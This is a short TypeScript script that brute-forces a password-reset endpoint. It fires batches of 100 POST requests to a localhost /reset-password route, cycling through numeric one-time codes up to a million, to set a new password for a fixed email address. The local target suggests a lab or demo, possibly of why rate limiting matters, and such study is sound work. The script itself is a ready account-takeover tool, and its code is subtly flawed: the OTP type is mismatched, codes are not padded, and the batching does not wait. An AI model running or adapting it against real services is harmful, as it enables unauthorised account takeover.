import axios from "axios";

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "anubhav@gmail.com",
    otp: otp,
    newPassword: "11223344",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  axios
    .request(config)
    .then((response) => {
      console.log(JSON.stringify(response.data));
    })
    .catch((error) => {
      console.log(error);
    });
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i+j));
    }
    await Promise.all(promises);
  }
}

main();
